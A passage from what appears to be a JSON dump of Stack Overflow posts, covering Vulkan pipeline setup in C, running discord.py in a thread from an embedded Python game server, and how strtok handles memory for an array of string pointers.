VkDebugUtilsMessengerEXT *callback = malloc(sizeof(VkDebugUtilsMessengerEXT));\n\n    if (errno == ENOMEM)\n        exit(EXIT_FAILURE);\n\n// glfw window\n    glfwInit();\n    glfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);\n    glfwWindowHint(GLFW_RESIZABLE, GLFW_FALSE);\n    window = glfwCreateWindow(500, 500, \"Vulkan\", VK_NULL_HANDLE, VK_NULL_HANDLE);\n\n    if (!window)\n        exit(EXIT_FAILURE);\n\n// instance\n    VkApplicationInfo appInfo = {};\n    appInfo.sType              = VK_STRUCTURE_TYPE_APPLICATION_INFO;\n    appInfo.pApplicationName   = \"Hello Triangle\";\n    appInfo.applicationVersion = VK_MAKE_VERSION(1, 0, 0);\n    appInfo.pEngineName        = \"No Engine\";\n    appInfo.engineVersion      = VK_MAKE_VERSION(1, 0, 0);\n    appInfo.apiVersion         = VK_API_VERSION_1_1;\n\n    VkInstanceCreateInfo instanceInfo = {};\n    instanceInfo.sType = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO;\n    instanceInfo.pApplicationInfo = &amp;appInfo;\n\n    // validation layers\n        const char *validationLayers[2] = {\"VK_LAYER_LUNARG_standard_validation\", \"VK_LAYER_LUNARG_api_dump\"};\n        instanceInfo.enabledLayerCount   = 2;\n        instanceInfo.ppEnabledLayerNames = validationLayers;\n\n    // extensions\n        char *ext1_p = VK_EXT_DEBUG_UTILS_EXTENSION_NAME;\n\n        uint32_t glfwExtensionCount = 0;\n        glfwGetRequiredInstanceExtensions(&amp;glfwExtensionCount);\n        uint32_t totalExtensionCount = glfwExtensionCount + 1;\n        const char **glfwExtensions = glfwGetRequiredInstanceExtensions(&amp;glfwExtensionCount);\n\n        const char *extensions[totalExtensionCount];\n        extensions[0] = ext1_p;\n        for (int i = 1; i &lt; glfwExtensionCount + 1; ++i)\n            extensions[i] = glfwExtensions[i - 1];\n\n        instanceInfo.enabledExtensionCount   = totalExtensionCount;\n        instanceInfo.ppEnabledExtensionNames = extensions;\n\n    VK_ASSERT(vkCreateInstance(&amp;instanceInfo, VK_NULL_HANDLE, instance));\n\n// validation callback\n    vui_createVulkanMessenger(*instance, callback);\n\n// surface\n    VK_ASSERT(glfwCreateWindowSurface(*instance, window, VK_NULL_HANDLE, surface));\n\n// physical device\n    uint32_t deviceCount = 0;\n    vkEnumeratePhysicalDevices(*instance, &amp;deviceCount, VK_NULL_HANDLE);\n    VkPhysicalDevice devices[deviceCount];\n    vkEnumeratePhysicalDevices(*instance, &amp;deviceCount, devices);\n    // there is only one device possible because I have no dedicated gpu\n    for (int i = 0; i &lt; deviceCount; ++i) {\n        physicalDevice = &amp;(devices[i]);\n        break;\n    }\n\n// device\n    uint32_t queueFamilyIndex = 0;\n\n    float queuePriority = 1.0f;\n    VkDeviceQueueCreateInfo queueCreateInfo = {};\n    queueCreateInfo.sType            = VK_STRUCTURE_TYPE_DEVICE_QUEUE_CREATE_INFO;\n    queueCreateInfo.queueFamilyIndex = queueFamilyIndex;\n    queueCreateInfo.queueCount       = 1;\n    queueCreateInfo.pQueuePriorities = &amp;queuePriority;\n\n    VkPhysicalDeviceFeatures deviceFeatures = {};\n    const char *deviceExtensions = VK_KHR_SWAPCHAIN_EXTENSION_NAME;\n\n    VkDeviceCreateInfo deviceInfo = {};\n    deviceInfo.sType                   = VK_STRUCTURE_TYPE_DEVICE_CREATE_INFO;\n    deviceInfo.queueCreateInfoCount    = 1;\n    deviceInfo.pQueueCreateInfos       = &amp;queueCreateInfo;\n    deviceInfo.pEnabledFeatures        = &amp;deviceFeatures;\n    deviceInfo.enabledExtensionCount   = 1;\n    deviceInfo.ppEnabledExtensionNames = &amp;deviceExtensions;\n    deviceInfo.enabledLayerCount       = 0;\n\n    VK_ASSERT(vkCreateDevice(*physicalDevice, &amp;deviceInfo, VK_NULL_HANDLE, device));\n    vkGetDeviceQueue(*device, queueFamilyIndex, 0, graphicsQueue);\n\n// swapchain\n    VkSurfaceCapabilitiesKHR capabilities;\n    vkGetPhysicalDeviceSurfaceCapabilitiesKHR(*physicalDevice, *surface, &amp;capabilities);\n    uint32_t formatCount;\n    vkGetPhysicalDeviceSurfaceFormatsKHR(*physicalDevice, *surface, &amp;formatCount, VK_NULL_HANDLE);\n    VkSurfaceFormatKHR formats[formatCount];\n    if (formatCount != 0)\n        vkGetPhysicalDeviceSurfaceFormatsKHR(*physicalDevice, *surface, &amp;formatCount, formats);\n\n    // these assumptions are fine for the purpose of debugging\n    VkSurfaceFormatKHR surfaceFormat = formats[1];\n    VkPresentModeKHR presentMode = VK_PRESENT_MODE_IMMEDIATE_KHR;\n    VkExtent2D extent = capabilities.currentExtent;\n    uint32_t imageCount = 3;\n\n    VkSwapchainCreateInfoKHR swapchainInfo = {};\n    swapchainInfo.sType                 = VK_STRUCTURE_TYPE_SWAPCHAIN_CREATE_INFO_KHR;\n    swapchainInfo.surface               = *surface;\n    swapchainInfo.minImageCount         = imageCount;\n    swapchainInfo.imageFormat           = surfaceFormat.format;\n    swapchainInfo.imageColorSpace       = surfaceFormat.colorSpace;\n    swapchainInfo.imageExtent           = extent;\n    swapchainInfo.imageArrayLayers      = 1;\n    swapchainInfo.imageUsage            = VK_IMAGE_USAGE_COLOR_ATTACHMENT_BIT;\n    swapchainInfo.imageSharingMode      = VK_SHARING_MODE_EXCLUSIVE;\n    swapchainInfo.queueFamilyIndexCount = 1;\n    swapchainInfo.pQueueFamilyIndices   = &amp;queueFamilyIndex;\n    swapchainInfo.preTransform          = capabilities.currentTransform;\n    swapchainInfo.compositeAlpha        = VK_COMPOSITE_ALPHA_OPAQUE_BIT_KHR;\n    swapchainInfo.presentMode           = presentMode;\n    swapchainInfo.clipped               = VK_TRUE;\n    swapchainInfo.oldSwapchain          = VK_NULL_HANDLE;\n\n    VK_ASSERT(vkCreateSwapchainKHR(*device, &amp;swapchainInfo, VK_NULL_HANDLE, swapChain));\n    vkGetSwapchainImagesKHR(*device, *swapChain, &amp;imageCount, VK_NULL_HANDLE);\n    vkGetSwapchainImagesKHR(*device, *swapChain, &amp;imageCount, swapChainImages);\n    *swapChainImageFormat = surfaceFormat.format;\n    *swapChainExtent      = extent;\n\n// render pass\n\n    // ! Please note: structs abstracted.\n\n    VK_ASSERT(vkCreateRenderPass(*device, &amp;renderPassInfo, VK_NULL_HANDLE, renderPass));\n\n// pipeline layout\n    VkPipelineLayoutCreateInfo pipelineLayoutInfo = {};\n    pipelineLayoutInfo.sType                  = VK_STRUCTURE_TYPE_PIPELINE_LAYOUT_CREATE_INFO;\n    pipelineLayoutInfo.setLayoutCount         = 0;\n    pipelineLayoutInfo.pushConstantRangeCount = 0;\n\n    VK_ASSERT(vkCreatePipelineLayout(*device, &amp;pipelineLayoutInfo, VK_NULL_HANDLE, pipelineLayout));\n\n// pipeline\n    const uint32_t vs_code[] = \n    {\n        #include \"absPath\"\n    };\n    VkShaderModule vertShaderModule = createShaderModule(*device, vs_code, sizeof(vs_code));\n    const uint32_t fs_code[] = \n    {\n        #include \"absPath\"\n    };\n    VkShaderModule fragShaderModule = createShaderModule(*device, fs_code, sizeof(fs_code));\n\n    VkPipelineShaderStageCreateInfo vertShaderStageInfo = {};\n    vertShaderStageInfo.sType  = VK_STRUCTURE_TYPE_PIPELINE_SHADER_STAGE_CREATE_INFO;\n    vertShaderStageInfo.stage  = VK_SHADER_STAGE_VERTEX_BIT;\n    vertShaderStageInfo.module = vertShaderModule;\n    vertShaderStageInfo.pName  = \"main\";\n\n    VkPipelineShaderStageCreateInfo fragShaderStageInfo = {};\n    fragShaderStageInfo.sType  = VK_STRUCTURE_TYPE_PIPELINE_SHADER_STAGE_CREATE_INFO;\n    fragShaderStageInfo.stage  = VK_SHADER_STAGE_FRAGMENT_BIT;\n    fragShaderStageInfo.module = fragShaderModule;\n    fragShaderStageInfo.pName  = \"main\";\n\n    VkPipelineShaderStageCreateInfo shaderStages[] = {vertShaderStageInfo, fragShaderStageInfo};\n\n    VkPipelineVertexInputStateCreateInfo vertexInputInfo = {};\n    vertexInputInfo.sType                           = VK_STRUCTURE_TYPE_PIPELINE_VERTEX_INPUT_STATE_CREATE_INFO;\n    vertexInputInfo.vertexBindingDescriptionCount   = 0;\n    vertexInputInfo.vertexAttributeDescriptionCount = 0;\n\n    VkPipelineInputAssemblyStateCreateInfo inputAssembly = {};\n    inputAssembly.sType                  = VK_STRUCTURE_TYPE_PIPELINE_INPUT_ASSEMBLY_STATE_CREATE_INFO;\n    inputAssembly.topology               = VK_PRIMITIVE_TOPOLOGY_TRIANGLE_LIST;\n    inputAssembly.primitiveRestartEnable = VK_FALSE;\n\n    VkViewport viewport = {};\n    viewport.x        = 0.0f;\n    viewport.y        = 0.0f;\n    viewport.width    = (float) (*swapChainExtent).width;\n    viewport.height   = (float) (*swapChainExtent).height;\n    viewport.minDepth = 0.0f;\n    viewport.maxDepth = 1.0f;\n\n    VkOffset2D offset;\n    offset.x = 0;\n    offset.y = 0;\n    VkRect2D scissor = {};\n    scissor.offset = offset;\n    scissor.extent = *swapChainExtent;\n\n    VkPipelineViewportStateCreateInfo viewportState = {};\n    viewportState.sType         = VK_STRUCTURE_TYPE_PIPELINE_VIEWPORT_STATE_CREATE_INFO;\n    viewportState.viewportCount = 1;\n    viewportState.pViewports    = &amp;viewport;\n    viewportState.scissorCount  = 1;\n    viewportState.pScissors     = &amp;scissor;\n\n    VkPipelineRasterizationStateCreateInfo rasterizer = {};\n    rasterizer.sType                   = VK_STRUCTURE_TYPE_PIPELINE_RASTERIZATION_STATE_CREATE_INFO;\n    rasterizer.depthClampEnable        = VK_FALSE;\n    rasterizer.rasterizerDiscardEnable = VK_FALSE;\n    rasterizer.polygonMode             = VK_POLYGON_MODE_FILL;\n    rasterizer.lineWidth               = 1.0f;\n    rasterizer.cullMode                = VK_CULL_MODE_BACK_BIT;\n    rasterizer.frontFace               = VK_FRONT_FACE_CLOCKWISE;\n    rasterizer.depthBiasEnable         = VK_FALSE;\n\n    VkPipelineMultisampleStateCreateInfo multisampling = {};\n    multisampling.sType                = VK_STRUCTURE_TYPE_PIPELINE_MULTISAMPLE_STATE_CREATE_INFO;\n    multisampling.sampleShadingEnable  = VK_FALSE;\n    multisampling.rasterizationSamples = VK_SAMPLE_COUNT_1_BIT;\n\n    VkPipelineColorBlendAttachmentState colorBlendAttachment = {};\n    colorBlendAttachment.colorWriteMask = VK_COLOR_COMPONENT_R_BIT | VK_COLOR_COMPONENT_G_BIT | VK_COLOR_COMPONENT_B_BIT | VK_COLOR_COMPONENT_A_BIT;\n    colorBlendAttachment.blendEnable    = VK_FALSE;\n\n    VkPipelineColorBlendStateCreateInfo colorBlending = {};\n    colorBlending.sType             = VK_STRUCTURE_TYPE_PIPELINE_COLOR_BLEND_STATE_CREATE_INFO;\n    colorBlending.logicOpEnable     = VK_FALSE;\n    colorBlending.logicOp           = VK_LOGIC_OP_COPY;\n    colorBlending.attachmentCount   = 1;\n    colorBlending.pAttachments      = &amp;colorBlendAttachment;\n    colorBlending.blendConstants[0] = 0.0f;\n    colorBlending.blendConstants[1] = 0.0f;\n    colorBlending.blendConstants[2] = 0.0f;\n    colorBlending.blendConstants[3] = 0.0f;\n\n    VkGraphicsPipelineCreateInfo pipelineInfo = {};\n    pipelineInfo.sType               = VK_STRUCTURE_TYPE_GRAPHICS_PIPELINE_CREATE_INFO;\n    pipelineInfo.stageCount          = 2;\n    pipelineInfo.pStages             = shaderStages;\n    pipelineInfo.pVertexInputState   = &amp;vertexInputInfo;\n    pipelineInfo.pInputAssemblyState = &amp;inputAssembly;\n    pipelineInfo.pViewportState      = &amp;viewportState;\n    pipelineInfo.pRasterizationState = &amp;rasterizer;\n    pipelineInfo.pMultisampleState   = &amp;multisampling;\n    pipelineInfo.pColorBlendState    = &amp;colorBlending;\n    pipelineInfo.layout              = *pipelineLayout;\n    pipelineInfo.renderPass          = *renderPass;\n    pipelineInfo.subpass             = 0;\n    pipelineInfo.basePipelineHandle  = VK_NULL_HANDLE;\n\n    printf(\"creating pipeline!\\n\");\n    VK_ASSERT(vkCreateGraphicsPipelines(*device, VK_NULL_HANDLE, 1, &amp;pipelineInfo, VK_NULL_HANDLE, graphicsPipeline));\n    printf(\"pipeline created!\\n\");\n}\n\nVkShaderModule createShaderModule(VkDevice device, const uint32_t *code, size_t size) {\n    VkShaderModule module;\n    VkShaderModuleCreateInfo shaderCreateInfo = \n    {\n        .sType    = VK_STRUCTURE_TYPE_SHADER_MODULE_CREATE_INFO,\n        .pNext    = VK_NULL_HANDLE,\n        .flags    = 0,\n        .codeSize = size,\n        .pCode    = code,\n    };\n    vkCreateShaderModule(device, &amp;shaderCreateInfo, VK_NULL_HANDLE, &amp;module);\n    return module;\n}\n\nstatic VKAPI_ATTR VkBool32 VKAPI_CALL debugCallback(VkDebugUtilsMessageSeverityFlagBitsEXT messageSeverity, VkDebugUtilsMessageTypeFlagsEXT messageType, const VkDebugUtilsMessengerCallbackDataEXT *pCallbackData, void *pUserData) \n{\n    printf(\"%s\\n\", pCallbackData-&gt;pMessage);\n    return VK_FALSE;\n}\n\nstatic void vui_createVulkanMessenger(VkInstance instance, VkDebugUtilsMessengerEXT *callback) \n{\n    PFN_vkCreateDebugUtilsMessengerEXT funcPointer = (PFN_vkCreateDebugUtilsMessengerEXT) vkGetInstanceProcAddr(instance, \"vkCreateDebugUtilsMessengerEXT\");\n    EXIT_ON_NULL(funcPointer);\n    VkDebugUtilsMessengerCreateInfoEXT debugUtilsMessengerInfo = \n    {\n        .sType           = VK_STRUCTURE_TYPE_DEBUG_UTILS_MESSENGER_CREATE_INFO_EXT,\n        .pNext           = VK_NULL_HANDLE,\n        .flags           = 0,\n        .messageSeverity = VK_DEBUG_UTILS_MESSAGE_SEVERITY_WARNING_BIT_EXT | VK_DEBUG_UTILS_MESSAGE_SEVERITY_ERROR_BIT_EXT | VK_DEBUG_UTILS_MESSAGE_SEVERITY_INFO_BIT_EXT,\n        .messageType     = VK_DEBUG_UTILS_MESSAGE_TYPE_GENERAL_BIT_EXT | VK_DEBUG_UTILS_MESSAGE_TYPE_VALIDATION_BIT_EXT | VK_DEBUG_UTILS_MESSAGE_TYPE_PERFORMANCE_BIT_EXT,\n        .pfnUserCallback = debugCallback,\n        .pUserData       = VK_NULL_HANDLE\n    };\n    VK_ASSERT(funcPointer(instance, &amp;debugUtilsMessengerInfo, VK_NULL_HANDLE, callback));\n}\n</code></pre>\n\n<p>Thank you for reading this, Ojad</p>\n"}, {"tags": ["c", "python-3.x", "asynchronous", "python-asyncio", "discord.py"], "answers": [{"comments": [{"owner": {"reputation": 7899, "user_id": 2245528, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/d98e5fd2aad06c6164ff91012b39641b?s=128&d=identicon&r=PG", "display_name": "cf stands with Monica", "link": "https://stackoverflow.com/users/2245528/cf-stands-with-monica"}, "edited": false, "score": 2, "creation_date": 1569692056, "post_id": 55054500, "comment_id": 102681640, "body": "For me, the critical bit was switching from <code>client.run</code> to <code>client.start</code> and changing the loop setup to <code>loop.create_task(start())</code> + <code>loop.run_forever</code>. I didn&#39;t use <code>get_child_watcher</code> and the code still runs just fine, as you noted. Thanks for pointing me in the right direction!"}, {"owner": {"reputation": 728, "user_id": 4207793, "user_type": "registered", "accept_rate": 76, "profile_image": "https://lh5.googleusercontent.com/-kMz6ARqycpY/AAAAAAAAAAI/AAAAAAAAAA4/Dv1I5D40BXM/photo.jpg?sz=128", "display_name": "IgorZ", "link": "https://stackoverflow.com/users/4207793/igorz"}, "reply_to_user": {"reputation": 7899, "user_id": 2245528, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/d98e5fd2aad06c6164ff91012b39641b?s=128&d=identicon&r=PG", "display_name": "cf stands with Monica", "link": "https://stackoverflow.com/users/2245528/cf-stands-with-monica"}, "edited": false, "score": 1, "creation_date": 1569878197, "post_id": 55054500, "comment_id": 102731477, "body": "@computerfreaker here is the working copy of the module that I&#39;ve made for my server: <a href=\"https://github.com/Igor-ua/python-shared/tree/master/sv_discord\" rel=\"nofollow noreferrer\">github</a>."}], "tags": [], "owner": {"reputation": 728, "user_id": 4207793, "user_type": "registered", "accept_rate": 76, "profile_image": "https://lh5.googleusercontent.com/-kMz6ARqycpY/AAAAAAAAAAI/AAAAAAAAAA4/Dv1I5D40BXM/photo.jpg?sz=128", "display_name": "IgorZ", "link": "https://stackoverflow.com/users/4207793/igorz"}, "is_accepted": true, "score": 9, "last_activity_date": 1601661470, "last_edit_date": 1601661470, "creation_date": 1552001519, "answer_id": 55054500, "question_id": 55030714, "link": "https://stackoverflow.com/questions/55030714/c-python-asyncio-running-discord-py-in-a-thread/55054500#55054500", "title": "C-Python asyncio: running discord.py in a thread", "body": "<p>Answering my own question:</p>\n<p>I should thank this source <a href=\"https://www.codependentcodr.com/asyncio-you-are-a-complex-beast.html\" rel=\"nofollow noreferrer\">asyncio-you-are-a-complex-beast</a> where I finally found a solution.<br />\nThe final working code looks like this:</p>\n<pre><code>import discord\nimport asyncio\nfrom threading import Thread\n\n\nclient = discord.Client()\n\n\ndef init():\n    loop = asyncio.get_event_loop()\n    loop.create_task(client.start(TOKEN))\n    Thread(target=loop.run_forever())\n\n\n@client.event\nasync def on_message(message):\n    if message.author == client.user:\n        return\n\n    print(&quot;on_message content: %s, channel: %s&quot; % (message.content, message.channel))\n    await message.channel.send('Hello!')\n\n\n@client.event\n    async def on_ready():\n    print(&quot;Discord bot logged in as: %s, %s&quot; % (client.user.name, client.user.id))\n</code></pre>\n<p>My main mistake was that for the game I compiled and used the latest <code>rewrite</code> version while inside the system over the pip I got <code>0.16.12</code> and read the <a href=\"https://discordpy.readthedocs.io/en/latest/api.html\" rel=\"nofollow noreferrer\">documentation for 0.16.12</a> while I had to look at <a href=\"https://discordpy.readthedocs.io/en/rewrite/\" rel=\"nofollow noreferrer\">discord.py.rewrite</a> (for example inside <code>on_message</code> I used wrong <code>client.send_message</code> while I had to use <code>message.channel.send</code>)</p>\n"}, {"tags": [], "owner": {"reputation": 19728, "user_id": 929999, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/8e38b941717ff6f519095ee81fcd09a7?s=128&d=identicon&r=PG", "display_name": "Torxed", "link": "https://stackoverflow.com/users/929999/torxed"}, "is_accepted": false, "score": 3, "last_activity_date": 1594725713, "creation_date": 1594725713, "answer_id": 62894021, "question_id": 55030714, "link": "https://stackoverflow.com/questions/55030714/c-python-asyncio-running-discord-py-in-a-thread/62894021#62894021", "title": "C-Python asyncio: running discord.py in a thread", "body": "<p>I had a similar edge case <em>(not really the intended use of <code>asyncio</code> but what the hell)</em> where I needed to Thread the <code>discord.py</code> instance.</p>\n<p>I ended up modifying your solution with the following:</p>\n<pre><code>class discordHost(discord.Client):\n    async def on_ready(self):\n        print(f'{DThread.discord_client.user} has connected.')\n\nclass Threader(Thread):\n    def __init__(self):\n        Thread.__init__(self)\n        self.loop = asyncio.get_event_loop()\n        self.start()\n\n    async def starter(self):\n        self.discord_client = discordHost()\n        await self.discord_client.start(DISCORD_TOKEN)\n\n    def run(self):\n        self.name = 'Discord.py'\n\n        self.loop.create_task(self.starter())\n        self.loop.run_forever()\n\nif not 'Discord.py' in [t.name for t in tenumerate()]:\n    DThread = Threader()\n</code></pre>\n<p>This does more or less the same thing, but I've subclassed <code>Thread</code> and subclassed <code>discord.Client</code> to more easily work with the outcome of the two.</p>\n<p>The <strong>only</strong> caveat here, is that <code>asyncio.get_event_loop()</code> has to be called <strong>before</strong> <code>Thread.start()</code>, otherwise it gets confused and losses it's context of the main thread.</p>\n"}], "owner": {"reputation": 728, "user_id": 4207793, "user_type": "registered", "accept_rate": 76, "profile_image": "https://lh5.googleusercontent.com/-kMz6ARqycpY/AAAAAAAAAAI/AAAAAAAAAA4/Dv1I5D40BXM/photo.jpg?sz=128", "display_name": "IgorZ", "link": "https://stackoverflow.com/users/4207793/igorz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4382, "favorite_count": 0, "accepted_answer_id": 55054500, "answer_count": 2, "score": 6, "last_activity_date": 1601661470, "creation_date": 1551900163, "last_edit_date": 1551959399, "question_id": 55030714, "link": "https://stackoverflow.com/questions/55030714/c-python-asyncio-running-discord-py-in-a-thread", "title": "C-Python asyncio: running discord.py in a thread", "body": "<p>I have to launch discord.py in a separate thread since I can't block my main thread.<br>\nIt is a game server <code>C/Python 3.7 (ubuntu 18)</code>  </p>\n\n<p><strong>C code:</strong></p>\n\n<pre><code>int pysDiscord_Init;\n...\nPyObject *psv_discord;\n\npsv_discord = Python_LoadModule(\"sv_discord\");\nif (psv_discord != NULL) {\n  pysDiscord_Init = Python_RegisterFunction(psv_discord, \"sv_discord\", \"init\");\n  Python_Execute(pysDiscord_Init, \"\");\n}\n</code></pre>\n\n<p><strong>sv_discord.py</strong></p>\n\n<pre><code>import discord\nimport asyncio\nimport threading\nfrom concurrent.futures import ThreadPoolExecutor\nimport multiprocessing\n\nTOKEN = '12345'\n\nclient = discord.Client()\n\ndef init():\n    print(\"Initializing Discord...\")\n    print(\"current_thread: %s\" % threading.current_thread())\n    t = threading.Thread(target=client.run, args=(TOKEN,))\n    t.start()\n\nor\n\ndef init():\n    print(\"Initializing Discord...\")\n    print(\"current_thread: %s\" % threading.current_thread())\n    loop = asyncio.new_event_loop()\n    asyncio.set_event_loop(loop)\n    asyncio.get_child_watcher().attach_loop(loop)\n    pool = ThreadPoolExecutor(max_workers=multiprocessing.cpu_count())\n    task = loop.run_in_executor(pool, client.run, TOKEN)\n    loop.run_until_complete(task)\n</code></pre>\n\n<p><strong>set_wakeup_fd exception:</strong></p>\n\n<pre><code>...\nInitializing Discord...\ncurrent_thread: &lt;_MainThread(MainThread, started 4150019840)&gt;\n\nException in thread Thread-1:\n Traceback (most recent call last):\n File \"./build/Lib/asyncio/unix_events.py\", line 92, in add_signal_handler\n ValueError: set_wakeup_fd only works in main thread\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n File \"./build/Lib/threading.py\", line 917, in _bootstrap_inner\n File \"./build/Lib/threading.py\", line 865, in run\n File \"./../source/discord.py-rewrite/discord/client.py\", line 550, in run\n File \"./build/Lib/asyncio/unix_events.py\", line 94, in add_signal_handler\nRuntimeError: set_wakeup_fd only works in main thread\n</code></pre>\n\n<p>I should mention that I tried the same code on the python (without the C code) and it works.<br>\nThis error tells me about the main thread. But I don't create <code>sv_discord</code> inside the new thread, and as you can see from the log, it is the <code>\"Main\"</code> thread inside <code>init()</code> method. I don't understand this.</p>\n"}, {"tags": ["c"], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 11161652, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-C9y1ooMa9DM/AAAAAAAAAAI/AAAAAAAAADc/qbYGia2Qs00/photo.jpg?sz=128", "display_name": "John Brown", "link": "https://stackoverflow.com/users/11161652/john-brown"}, "edited": false, "score": 0, "creation_date": 1551901327, "post_id": 55030855, "comment_id": 96814465, "body": "Oh ok, thanks, that&#39;s good to know. So, I was thinking about it wrong. <code>tokens</code> is not a 2 dimensional array of chars, but an array of pointers. So the compiler allocates for sizeof(void *) not for multiple characters."}, {"owner": {"reputation": 4046, "user_id": 4971422, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4abf51a937ddda51cc6813445605c50?s=128&d=identicon&r=PG&f=1", "display_name": "FredK", "link": "https://stackoverflow.com/users/4971422/fredk"}, "edited": false, "score": 1, "creation_date": 1551903278, "post_id": 55030855, "comment_id": 96815536, "body": "@Doug Currie It should be noted that strdup is not a standard C library function, and is likely not available on platforms that are not POSIX compliant."}], "tags": [], "owner": {"reputation": 38619, "user_id": 33252, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d0b55a5e4a7eff1bf29eae5bd314f0d?s=128&d=identicon&r=PG", "display_name": "Doug Currie", "link": "https://stackoverflow.com/users/33252/doug-currie"}, "is_accepted": true, "score": 2, "last_activity_date": 1551901149, "last_edit_date": 1551901149, "creation_date": 1551900637, "answer_id": 55030855, "question_id": 55030606, "link": "https://stackoverflow.com/questions/55030606/how-does-the-compiler-allocate-memory-for-an-array-of-strings-in-c/55030855#55030855", "title": "How does the compiler allocate memory for an array of strings in C?", "body": "<p><code>strtok</code> is a bad citizen. </p>\n\n<p>For one thing, it retains state, as you've implicitly used when you call <code>strtok(NULL,...)</code> -- this state is stored in the private memory of the Standard C Library, which means only single threaded programs can use <code>strtok</code>. Note that there is a reentrant version called <code>strtok_r</code> in some libraries.</p>\n\n<p>For another, and to answer your question, <code>strtok</code> modifies its input. It doesn't allocate space for the strings; it writes NUL characters in place of your delimiter in the input string, and returns a pointer into the input string.</p>\n\n<p>You are correct that <code>strtok</code> can return more than 10 results. You should check for that in your code so you don't write beyond the end of <code>tokens</code>. A reliable program would either set an upper limit, like your <code>10</code>, and check for it, reporting an error if it's exceeded, or dynamically allocate the <code>tokens</code> array with <code>malloc</code>, and <code>realloc</code> it if it gets too big. Then the error occurs when you fun out of memory.</p>\n\n<p>Note that you can also work around the problem of <code>strtok</code> modifying your input string by <code>strdup</code>ing before passing it to <code>strtok</code>. Then you'll have to free the new string after both it and <code>tokens</code>, which points to it, are going out of scope.</p>\n"}, {"tags": [], "owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "is_accepted": false, "score": 1, "last_activity_date": 1551903568, "creation_date": 1551903568, "answer_id": 55031538, "question_id": 55030606, "link": "https://stackoverflow.com/questions/55030606/how-does-the-compiler-allocate-memory-for-an-array-of-strings-in-c/55031538#55031538", "title": "How does the compiler allocate memory for an array of strings in C?", "body": "<p><code>tokens</code> is an array of pointers.</p>\n\n<p>The distinction between strings and pointers if often fuzzy. In some situations strings are better thought out as arrays, in other situations as pointers.</p>\n\n<p>Anyway... in your example <code>input</code> is an array and <code>tokens</code> is an array of pointers to a place within <code>input</code>.</p>\n\n<p>The data inside <code>input</code> is changed with each call to <code>strtok()</code></p>\n\n<p>So, step by step</p>\n\n<pre><code>// input[] = \"foo bar baz\";\ntokens[0] = strtok(input, \" \");\n// input[] = \"foo\\0bar baz\";\n//            ^-- tokens[0] points here\ntokens[1] = strtok(NULL, \" \");\n// input[] = \"foo\\0bar\\0baz\";\n//                 ^-- tokens[1] points here\ntokens[2] = strtok(NULL, \" \");\n// input[] = \"foo\\0bar\\0baz\";\n//                      ^-- tokens[2] points here\n// next strtok returns NULL\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 11161652, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-C9y1ooMa9DM/AAAAAAAAAAI/AAAAAAAAADc/qbYGia2Qs00/photo.jpg?sz=128", "display_name": "John Brown", "link": "https://stackoverflow.com/users/11161652/john-brown"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "accepted_answer_id": 55030855, "answer_count": 2, "score": 0, "last_activity_date": 1551903568, "creation_date": 1551899790, "question_id": 55030606, "link": "https://stackoverflow.com/questions/55030606/how-does-the-compiler-allocate-memory-for-an-array-of-strings-in-c", "title": "How does the compiler allocate memory for an array of strings in C?", "body": "<p>I typed up this block of code for an assignment:</p>\n\n<pre><code>char *tokens[10];\n\nvoid parse(char* input);\n\nvoid main(void) \n{\n    char input[] = \"Parse this please.\";\n    parse(input);\n\n    for(int i = 2; i &gt;= 0; i--) {\n        printf(\"%s \", tokens[i]);\n    }\n}\n\nvoid parse(char* input)\n{\n    int i = 0;\n    tokens[i] = strtok(input, \" \");\n\n    while(tokens[i] != NULL) {\n        i++;\n        tokens[i] = strtok(NULL, \" \");\n    }\n}\n</code></pre>\n\n<p>But, looking at it, I'm not sure how the memory allocation works. I didn't define the length of the individual strings as far as I know, just how many strings are in the string array tokens (10). Do I have this backwards? If not, then is the compiler allocating the length of each string dynamically? In need of some clarification.</p>\n"}, {"tags": ["c", "networking", "libc"], "comments": [{"owner": {"reputation": 3984, "user_id": 164344, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c978ca7e1c3da231710b8c114009faa5?s=128&d=identicon&r=PG&f=1", "display_name": "Tim", "link": "https://stackoverflow.com/users/164344/tim"}, "edited": false, "score": 4, "creation_date": 1551900821, "post_id": 55030542, "comment_id": 96814199, "body": "There is no libc function for this. You will have to write your own."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551923910, "post_id": 55030542, "comment_id": 96822177, "body": "when calling <code>getsockopt()</code>, and it returns a &#39;active&#39; indication, then call <code>printf()</code> with the name, etc to <code>stdout</code>.  This hints at each case in the posted code will have a different content for the <code>printf()</code> so should be  each each case"}], "owner": {"reputation": 3151, "user_id": 9574771, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d205b5efbf77202893f777a90fde50d?s=128&d=identicon&r=PG&f=1", "display_name": "Kaiepi", "link": "https://stackoverflow.com/users/9574771/kaiepi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 23, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1551899547, "creation_date": 1551899547, "question_id": 55030542, "link": 